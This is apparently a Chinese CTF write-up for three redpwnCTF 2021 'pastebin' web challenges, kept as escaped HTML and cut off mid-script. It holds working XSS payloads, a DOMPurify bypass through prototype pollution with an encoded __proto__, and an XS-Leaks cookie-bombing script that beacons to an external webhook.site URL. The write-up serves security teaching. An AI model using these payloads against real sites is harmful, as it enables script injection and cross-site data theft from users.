&lt;h2 id="webpastebin-1">web/pastebin-1&lt;/h2>
&lt;blockquote>
&lt;p>Ah, the classic pastebin.&lt;/p>
&lt;p>&lt;a href="https://pastebin-1.mc.ax/">pastebin-1.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-1">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs">main.rs&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>pastebinÔºåÁ±ª‰ººÁïôË®ÄÊùøÁöÑÊ†∑Â≠ê ÂèØ‰ª•ÂèëË°®paste&lt;/p>
&lt;p>Á¨¨‰∏ÄÂèçÂ∫îÂ∞±ÊòØxssÔºåËØï‰∏Ä‰∏ãalert(1) ÊàêÂäüÂºπÁ™ó&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png" alt="image-20210710093018218">&lt;/p>
&lt;p>È¢òÁõÆÂè¶Â§ñÊèê‰æõ‰∫Ü‰∏Ä‰∏™/admin-botÈ°µÈù¢Ôºå&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png" alt="image-20210710093113748">&lt;/p>
&lt;p>Ëøô‰∏™ÔºåÂ¶•Â¶•ÁöÑxssÂ•ΩÂêß Áõ¥Êé•xss platform‰∏ÄÊääÊ¢≠ÔºÅ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png" alt="image-20210710094254880">&lt;/p>
&lt;h2 id="webpastebin-2-social-edition">***web/pastebin-2-social-edition&lt;/h2>
&lt;blockquote>
&lt;p>Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.&lt;/p>
&lt;p>&lt;a href="https://pastebin-2-social-edition.mc.ax/">pastebin-2-social-edition.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-2-social-edition">Admin bot&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ËøôÊ¨°adminbot‰ºöÁªôËá™Â∑±ÁöÑpaste‰∏ãÈù¢ÁïôË®ÄÂõûÂ§ç&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8Vc6Cyf.png" alt="8Vc6Cyf.png">&lt;/p>
&lt;p>ÊòæÁÑ∂Âïä ËøòÊòØxssÔºå‰ΩÜÊòØÁî®‰∫ÜDOMPurifyÔºåÂπ∂‰∏îËøô‰∏™ÁâàÊú¨‰πüÂæàÊñ∞ ‰πãÂâçÁöÑ‰∏Ä‰∫õbug‰πüÊ≤°Ê≥ïÂà©Áî®Ôºå&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition">ÂèÇËÄÉwp&lt;/a>&lt;/p>
&lt;p>ÁúãÊ∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png" alt="image-20210806171955901">&lt;/p>
&lt;p>Ê≥®ÊÑèÂà∞ËøôÈáåÔºåÂ¶ÇÊûúÊúâÈîôËØØ Â∞±‰ºöËÆæÁΩÆ&lt;code>errorContainer.innerHTML = message;&lt;/code>ÔºåÂ¶ÇÊûúÊàë‰ª¨ËÉΩÊéßÂà∂error message Â∞±ËÉΩÂÅöÂà∞xss‰∫ÜÔºõËøôÈáåÂà©Áî®ÂéüÂûãÊ±°Êüìprototype pollutionÔºåÂç≥‰ΩøDOMPurifyÂèØ‰ª•ÈòªÊå°‰∏Ä‰∫õxssÂ∏∏Áî®ÁöÑÊ†áÁ≠æÊàñËÄÖÂ±ûÊÄßÔºå‰πüÈòªÊ≠¢‰∏ç‰∫ÜÂéüÂûãÊ±°Êüì&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êàë‰ª¨ÂèØ‰ª•ÊääerrorÊ±°ÊüìÊàê‰ªªÊÑèÂÄºÔºåmessageÊ±°Êüì‰∏∫xssÂÜÖÂÆπÂíåpayload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂΩìËØ∑Ê±ÇË¢´Ëß¶ÂèëÊó∂ÔºåerrorÂíåmessageÂ∞±ÈÉΩÊòØÊàë‰ª¨Ëá™ÂÆöÁöÑÂÄº‰∫ÜÔºõËôΩÁÑ∂DOMPurify‰ºöÂØπ&lt;code>__proto__&lt;/code>ËøõË°åÁßªÈô§Ôºå‰ΩÜÊòØÂõ†‰∏∫‰∏äÈù¢&lt;code>const fieldsetName = decodeURIComponent(fieldset.name);&lt;/code>ÔºåÊâÄ‰ª•ÂÜçÂØπ&lt;code>__proto__&lt;/code>Êù•‰∏ÄÊâãurlencodeÂ∞±ËÉΩÁªïËøá‰∫Ü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;%255F_proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webpastebin-3">***web/pastebin-3&lt;/h2>
&lt;blockquote>
&lt;p>Boy, there sure are a lot of pastebins. Gotta think of new themes&amp;hellip;&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>ËøòÊòØ‰∏Ä‰∏™ÂæàÁÆÄÂçïÁöÑÈ°µÈù¢ create pasteÔºåÂ¢ûÂä†‰∫Ü‰∏Ä‰∏™ÊêúÁ¥¢ÁöÑÂäüËÉΩ&lt;/p>
&lt;p>ÂÖàÁúã/viewË∑ØÁî±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png" alt="image-20210808142853227">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png" alt="image-20210808141859178">&lt;/p>
&lt;p>Êàë‰ª¨ÁöÑ‰æøÁ≠æ ÊÄª‰Ωì‰ºö‰ª•‰∏Ä‰∏™urlÁöÑÂΩ¢ÂºèÊîæÂÖ•iframe‰∏≠ÔºåÊé•ÁùÄÂéªÁúãÁúãsanbox_urlÁöÑÊ∏≤ÊüìÊÉÖÂÜµ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png" alt="image-20210808141709394">&lt;/p>
&lt;p>ËÄå‰∫ÆÁÇπÊòØÔºåÊàë‰ª¨ÁöÑpasteÂèàË¢´Áõ¥Êé•ÊîæÂÖ•ÂèçÂºïÂè∑‰∏≠Èó¥‰∫ÜÔºåÂ¶ÇÊûúÊàë‰ª¨Áî®Á±ª‰ºº&lt;code>${alert(1)}&lt;/code>ÁöÑ‰∏úË•øÁõ¥Êé•Â∞±ÂèØ‰ª•Ë∑ëjs‰∫ÜÔºÅ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png" alt="image-20210808142359209">&lt;/p>
&lt;p>Áé∞Âú®Êàë‰ª¨Êúâ‰∫ÜÂèØ‰ª•Êìç‰Ωújs‰ª£Á†ÅÁöÑÂú∞Êñπ‚Äî‚Äî‰ΩÜÊòØËøôÊòØÂú®sandbox‰∏≠Ôºå‰∏é‰∏ªÈ°µÈù¢Âπ∂‰∏çÊòØÂêåÊ∫êÁöÑü§î&lt;/p>
&lt;p>ÂÜçÁúãÁúãÊñ∞Âä†ÂÖ•ÁöÑsearchÂäüËÉΩ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png" alt="image-20210808143003626">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËøôÈáåË¶ÅÂÖàÊèíÊí≠‰∏ÄÊù°Áü•ËØÜ‰∫Ü &lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a>ÔºàÊõ¥Â§öÁöÑÁõ∏ÂÖ≥ÂèÇËÄÉÈìæÊé•ÊîæÂà∞ÂêéÈù¢‰∫ÜÔºâÔºå‰∏Ä‰∏™Â∏∏ËßÅÁöÑxsleakÊîªÂáªËØ¶ËßÅ&lt;a href="https://xsleaks.dev/docs/attacks/error-events/">error events&lt;/a>&lt;/p>
&lt;p>&lt;em>Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web‚Äôs core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ‚Äî‚Äîfrom XSLeaks wiki&lt;/em>&lt;/p>
&lt;p>/search‰ΩøÁî®ÁöÑÊòØflask‰∏≠ÁöÑflash()Ê∂àÊÅØÈó™Áé∞Êù•Â±ïÁ§∫ÊêúÁ¥¢ÁöÑÁªìÊûúÔºåÂÆÉ‰ºöÂ≠òÂÇ®Âú®session cookie‰∏≠ÔºåÂ¶ÇÊûúÊ∂àÊÅØÊØî‰ºöËØùcookieÂ§ßÁöÑËØù‰ºöÂØºËá¥Ê∂àÊÅØÈó™Áé∞ÈùôÈªòÂ§±Ë¥•‚Äî‚ÄîÊàë‰ª¨Âà©Áî®Ëøô‰∏ÄÊù°ÁâπÊÄßÔºåÁî®ÈïøÈïøÁöÑcookieÔºåÂ¶ÇÊûúËØ∑Ê±ÇÊàêÂäü ÈÇ£‰πàÈúÄË¶ÅÊòæÁ§∫flashÊó∂cookieÂ∞Ü‰ºöË∂ÖËøáÈôêÂà∂Êä•ÈîôÔºåËÄåËØ∑Ê±ÇÂ§±Ë¥• Â∞±Âè™ÊúâNo results foundÁü≠Áü≠ÁöÑ‰∏ÄÊù°Ôºå‰∏ç‰ºöÊä•400&lt;/p>
&lt;p>Êàë‰ª¨Áî®XSLeaks wiki‰∏äÁªôÂá∫ÁöÑ probeError snippet&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Onload event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Error event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËôΩÁÑ∂ÂêåÁ´ôÁöÑcookiesÔºàsame-site cookiesÔºâÈÄöÂ∏∏‰ºöÈòªÊ≠¢ËøôÁßçÊÉÖÂÜµÔºå‰ΩÜÁî±‰∫éÈ¢ò‰∏≠ÁöÑsandboxÊòØÂ≠êÂüüÔºåÂπ∂‰∏çÊòØÂêåÁ´ôÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•probeErrorÂèØ‰ª•Ê£ÄÊµãÂà∞Ôºå‰∏ãÈù¢ÊòØËÑöÊú¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{c00k13_b0mb1n6_15_f4k3_vu&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">prefix&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
